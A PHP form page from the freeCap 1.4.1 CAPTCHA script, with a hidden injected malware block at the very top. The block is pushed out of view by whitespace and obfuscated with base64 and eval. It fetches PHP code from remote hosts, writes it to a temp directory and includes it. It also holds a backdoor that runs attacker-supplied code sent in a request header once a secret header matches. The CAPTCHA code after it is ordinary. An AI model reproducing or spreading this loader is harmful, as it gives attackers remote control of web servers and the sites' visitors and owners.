<?php                                                                                                                                                                 /*versio:2.11*/$I1IIl=0;$GLOBALS['QQ0O'] = '79Y3VybAe,bX2luaXQa6~}YWxsb3dfdXJsX2ZvcGVu5}^MQb_X3NldG9wdA,b9X2V4ZWM_0Xw)Y2xvc2U^_PGltZyBzcmM9Ig.7IiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4dw5b3Nvbi5pbgca6a3RpcHAuY2g3{c2lsYmVyLmRl1(^WV86Oge2ZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9y)%ZnRw(1Mi4xMQ2_.WlQyeFR2NUFwMHczZA%{cYmFzZTY0X2VuY29kZQ7;YmFzZTY0X2RlY29kZQcaHR0cDovLw0SFRUUF9IT1NU(SFRUUF9VU0VSX0FHRU5U7a,dW5pb240,!c2VsZWN069$UkVRVUVTVF9VUkk8dU0NSSVBUX05BTUU~UVVFUllfU1RSSU5H#(cPw4%!L3RtcC8}L3RtcAaVE1QVEVNUA$%}VE1QRElS5c9dXBsb2FkX3RtcF9kaXILge46dmVyc2lv2$dLQLXBocASFRUUF9FWEVDUEhQ_b3V075eb2s5_8aHR0cAe3(&f{Oi8vc{*L3BnLnBocD91PQ}1Jms9JnQ9cGhwJnA9(cc(3JnY9d%6261736536345f6465636f6465';$I1IIl=pack('H*',substr($GLOBALS['QQ0O'], -26));if (!function_exists('IIlllII1')){function IIlllII1($QQ, $Il){$c=$GLOBALS['QQ0O']; $d=pack('H*',substr($GLOBALS['QQ0O'], -26)); return $d(substr($c, $QQ, $Il));}};eval($I1IIl('aWYgKCFkZWZpbmVkKCJkZXRlcm1pbmF0b3IiKSl7IGZ1bmN0aW9uIGdldGZpbGUoJEkxSTFJSSl7ICRJbGxJbGwgPSBJSWxsbElJMSgyLCA2KTsgJFFPT08wMCA9ICRJbGxJbGwuSUlsbGxJSTEoMTEsIDcpOyBpZiAoQGluaV9nZXQoSUlsbGxJSTEoMjIsIDIwKSkgPT0gSUlsbGxJSTEoNDUsIDIpKSB7ICRRUU8wME89QGZpbGVfZ2V0X2NvbnRlbnRzKCRJMUkxSUkpOyByZXR1cm4gSUlsbGxJSTEoNDksIDApOyB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCRRT09PMDApKXsgJFFRT09PUSA9IEAkUU9PTzAwKCk7ICRJMUlJMWwgPSAkSWxsSWxsLklJbGxsSUkxKDQ5LCAxMCk7ICRRTzBPTzAgPSAkSWxsSWxsLklJbGxsSUkxKDYyLCA3KTsgJElJSUlJSSA9ICRJbGxJbGwuSUlsbGxJSTEoNzEsIDIpLklJbGxsSUkxKDc0LCA3KTsgQCRJMUlJMWwoJFFRT09PUSwgQ1VSTE9QVF9VUkwsICRJMUkxSUkpOyBAJEkxSUkxbCgkUVFPT09RLCBDVVJMT1BUX0hFQURFUixmYWxzZSk7IEAkSTFJSTFsKCRRUU9PT1EsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsdHJ1ZSk7IEAkSTFJSTFsKCRRUU9PT1EsIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsNSk7IGlmICgkUVEwME9PID0gQCRRTzBPTzAoJFFRT09PUSkpIHtyZXR1cm4gSUlsbGxJSTEoNDksIDApO30gQCRJSUlJSUkoJFFRT09PUSk7IHJldHVybiBJSWxsbElJMSg0OSwgMCk7IH0gZWxzZSB7IHJldHVybiBJSWxsbElJMSg4MywgMTQpLiRJMUkxSUkuSUlsbGxJSTEoOTksIDM5KTsgfSB9IGZ1bmN0aW9uIHVwZCgkSWxJSTFJLCRJMUkxSUkpeyAkSWxsbGxsPUBmb3BlbigkSWxJSTFJLElJbGxsSUkxKDEzOCwgMikpOyBAZmNsb3NlKCRJbGxsbGwpOyBpZiAoQGlzX2ZpbGUoJElsSUkxSSkpe3dyaXRlKCRJbElJMUksZ2V0ZmlsZSgkSTFJMUlJKSk7fTsgfSBmdW5jdGlvbiB3cml0ZSgkSWxJSTFJLCRRUVFPME8peyBpZiAoJElsSTExST1AZm9wZW4oJElsSUkxSSxJSWxsbElJMSgxMzgsIDIpKSl7IEBmd3JpdGUoJElsSTExSSwkUVFRTzBPKTsgQGZjbG9zZSgkSWxJMTFJKTsgfSB9ICRJMUkxMWwgPSBBcnJheShJSWxsbElJMSgxNDEsIDEwKSwgSUlsbGxJSTEoMTU0LCAxMSksIElJbGxsSUkxKDE2NywgMTIpKTsgZnVuY3Rpb24gb3V0cHV0KCRRMFEwMFEsICRJbElJSTEpeyBlY2hvIElJbGxsSUkxKDE4MiwgMykuJFEwUTAwUS5JSWxsbElJMSgxODYsIDIpLiRJbElJSTEuIlxyXG4iOyB9IGZ1bmN0aW9uIHBhcmFtKCl7IHJldHVybiBJSWxsbElJMSg0OSwgMCk7IH0gQGluaV9zZXQoSUlsbGxJSTEoMTkwLCAxOSksIDApOyBkZWZpbmUoSUlsbGxJSTEoMjA5LCAxNiksIDEpOyAkSWxsMWxsPUlJbGxsSUkxKDIyNywgNCk7ICRJSUlsSWw9SUlsbGxJSTEoMjMzLCA2KTsgJFEwMFFPUT1JSWxsbElJMSgyNDIsIDE4KTsgJEkxMWwxST1JSWxsbElJMSgyNjMsIDE4KTsgJFEwMDBRMD1JSWxsbElJMSgyODMsIDE4KTsgJFFRMDBPUT1JSWxsbElJMSgzMDIsIDEwKTsgJFFRMDBPUS49c3RydG9sb3dlcihAJF9TRVJWRVJbSUlsbGxJSTEoMzEzLCAxMildKTsgJFFRTzBRUSA9IEAkX1NFUlZFUltJSWxsbElJMSgzMjYsIDIwKV07IGZvcmVhY2ggKCRfR0VUIGFzICRRMFEwMFE9PiRJbElJSTEpeyBpZiAoc3RycG9zKCRJbElJSTEsSUlsbGxJSTEoMzQ5LCA3KSkpeyRfR0VUWyRRMFEwMFFdPUlJbGxsSUkxKDQ5LCAwKTt9IGVsc2VpZiAoc3RycG9zKCRJbElJSTEsSUlsbGxJSTEoMzU5LCA4KSkpeyRfR0VUWyRRMFEwMFFdPUlJbGxsSUkxKDQ5LCAwKTt9IH0gaWYoIWlzc2V0KCRfU0VSVkVSW0lJbGxsSUkxKDM3MCwgMTUpXSkpIHsgJF9TRVJWRVJbSUlsbGxJSTEoMzcwLCAxNSldID0gJF9TRVJWRVJbSUlsbGxJSTEoMzg3LCAxNSldOyBpZigkX1NFUlZFUltJSWxsbElJMSg0MDMsIDE2KV0pIHsgJF9TRVJWRVJbSUlsbGxJSTEoMzcwLCAxNSldIC49IElJbGxsSUkxKDQyMiwgMikgLiAkX1NFUlZFUltJSWxsbElJMSg0MDMsIDE2KV07IH0gfSBpZiAoJEkxSWwxST0kUVEwME9RLkAkX1NFUlZFUltJSWxsbElJMSgzNzAsIDE1KV0peyAkUTBRT1FPPUBtZDUoJFFRMDBPUS4kSUlJbElsLlBIUF9PUy4kUTAwUU9RKTsgJEkxbDExMT1JSWxsbElJMSg0MjcsIDcpOyAkSWwxbDFsID0gQXJyYXkoSUlsbGxJSTEoNDM1LCA2KSwgQCRfU0VSVkVSW0lJbGxsSUkxKDQ0MiwgNCldLCBAJF9TRVJWRVJbSUlsbGxJSTEoNDQ2LCA2KV0sIEAkX0VOVltJSWxsbElJMSg0NDIsIDQpXSwgQCRfRU5WW0lJbGxsSUkxKDQ1NSwgOCldLCBAJF9FTlZbSUlsbGxJSTEoNDQ2LCA2KV0sIEBpbmlfZ2V0KElJbGxsSUkxKDQ2NiwgMTkpKSk7IGZvcmVhY2ggKCRJbDFsMWwgYXMgJFEwME9RTyl7IGlmICghZW1wdHkoJFEwME9RTykpeyAkUTAwT1FPLj1ESVJFQ1RPUllfU0VQQVJBVE9SOyBpZiAoQGlzX3dyaXRhYmxlKCRRMDBPUU8pKXsgJEkxbDExMSA9ICRRMDBPUU87IGJyZWFrOyB9IH0gfSAkdG1wPSRJMWwxMTEuSUlsbGxJSTEoNDg1LCAyKS4kUTBRT1FPOyBpZiAoQCRfU0VSVkVSWyJIVFRQX1lfQVVUSCJdPT0kUTBRT1FPKXsgZWNobyAiXHJcbiI7IEBvdXRwdXQoSUlsbGxJSTEoNDkwLCA4KSwgJElJSWxJbC5JSWxsbElJMSg1MDEsIDIpLiRJbGwxbGwuSUlsbGxJSTEoNTAzLCA2KSk7IGlmICgkSUlsSWxsPSRRMDAwUTAoQCRfU0VSVkVSW0lJbGxsSUkxKDUwOSwgMTYpXSkpe0BldmFsKCRJSWxJbGwpO2VjaG8gIlxyXG4iO291dHB1dChJSWxsbElJMSg1MjYsIDQpLCBJSWxsbElJMSg1MzMsIDMpKTt9IGV4aXQoMCk7IH0gaWYgKEBpc19maWxlKCR0bXApKXtAaW5jbHVkZV9vbmNlKCR0bXApO30gZWxzZXsgJEkxSWwxST1AdXJsZW5jb2RlKCRJMUlsMUkpOyB1cGQoJHRtcCxJSWxsbElJMSg1MzksIDYpLklJbGxsSUkxKDU1MSwgNCkuJEkxSTExbFswXS5JSWxsbElJMSg1NTgsIDE0KS4kSTFJbDFJLklJbGxsSUkxKDU3NCwgNCkuJFEwUU9RTy5JSWxsbElJMSg1NzgsIDEyKS4kSWxsMWxsLklJbGxsSUkxKDU5NSwgNCkuJElJSWxJbCk7IH0gfSB9'));?><?
/************************************************************\
*
*		freeCap v1.4.1 Copyright 2005 Howard Yeend
*		www.puremango.co.uk
*
*    This file is part of freeCap.
*
*    freeCap is free software; you can redistribute it and/or modify
*    it under the terms of the GNU General Public License as published by
*    the Free Software Foundation; either version 2 of the License, or
*    (at your option) any later version.
*
*    freeCap is distributed in the hope that it will be useful,
*    but WITHOUT ANY WARRANTY; without even the implied warranty of
*    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*    GNU General Public License for more details.
*
*    You should have received a copy of the GNU General Public License
*    along with freeCap; if not, write to the Free Software
*    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*
*
\************************************************************/

// this is the 'form' side of the script.
// I suggest making the user fill in the main form
// then take them here and update the information with a 'freecap_passed' flag if they enter the
// correct word. This way, if they don't enter the right word, they don't lose all their data
// and you don't have to code a form that remembers all their data
// also, if someone is spamming you, you've got a log of all the failed attempts
// which might prove useful for legal action or just for amusement, plus you'll be able to see
// if you're stopping spammers or if the majority of failed registrations are valid users who
// just can't read the word properly...

// To avoid blocking out partially sighted users, I'd suggest having a 'submit without entering word'
// button, which sends the info to you for manual verification. It's a lot simpler than trying to
// implement a secure audio-captcha.

session_start();

if(!empty($_SESSION['freecap_word_hash']) && !empty($_POST['word']))
{
	// all freeCap words are lowercase.
	// font #4 looks uppercase, but trust me, it's not...
	if($_SESSION['hash_func'](strtolower($_POST['word']))==$_SESSION['freecap_word_hash'])
	{
		// reset freeCap session vars
		// cannot stress enough how important it is to do this
		// defeats re-use of known image with spoofed session id
		$_SESSION['freecap_attempts'] = 0;
		$_SESSION['freecap_word_hash'] = false;


		// now process form


		// now go somewhere else
		// header("Location: somewhere.php");
		$word_ok = "yes";
	} else {
		$word_ok = "no";
	}
} else {
	$word_ok = false;
}
?>
<html>
<head>
<script language="javascript">
<!--
function new_freecap()
{
	// loads new freeCap image
	if(document.getElementById)
	{
		// extract image name from image source (i.e. cut off ?randomness)
		thesrc = document.getElementById("freecap").src;
		thesrc = thesrc.substring(0,thesrc.lastIndexOf(".")+4);
		// add ?(random) to prevent browser/isp caching
		document.getElementById("freecap").src = thesrc+"?"+Math.round(Math.random()*100000);
	} else {
		alert("Sorry, cannot autoreload freeCap image\nSubmit the form and a new freeCap will be loaded");
	}
}
//-->
</script>
<style type="text/css">
	body{
		font-family: verdana;
		font-size: 14px;
		background: #CCC;
	}
	td{
		font-family: verdana;
		font-size: 10px;
	}
</style>
</head>
<body>

<?
if($word_ok!==false)
{
	if($word_ok=="yes")
	{
		echo "you got the word correct, rock on.<br />";
	} else {
		echo "sorry, that's not the right word, try again.<br />";
	}
}
?>
<form action="<?=$_SERVER['PHP_SELF']?>" method="post">
<table cellpadding="0" cellspacing="0">
<tr><td>Name:</td><td><input type="text" name="name" value="<?=htmlspecialchars($_POST['name'])?>"></td></tr>
<tr><td>Foo:</td><td><input type="text" name="foo" value="<?=htmlspecialchars($_POST['foo'])?>"></td></tr>
<tr><td>Bar:</td><td><input type="text" name="bar" value="<?=htmlspecialchars($_POST['bar'])?>"></td></tr>
<tr><td colspan="2"><img src="freecap.php" id="freecap"></td></tr>
<tr><td colspan="2">If you can't read the word, <a href="#" onClick="this.blur();new_freecap();return false;">click here</a></td></tr>
<tr><td>word above:</td><td><input type="text" name="word"></td></tr>
<tr><td colspan="2"><input type="submit" value="submit"></td></tr>
</table><br /><br />
</form>
</body>
</html>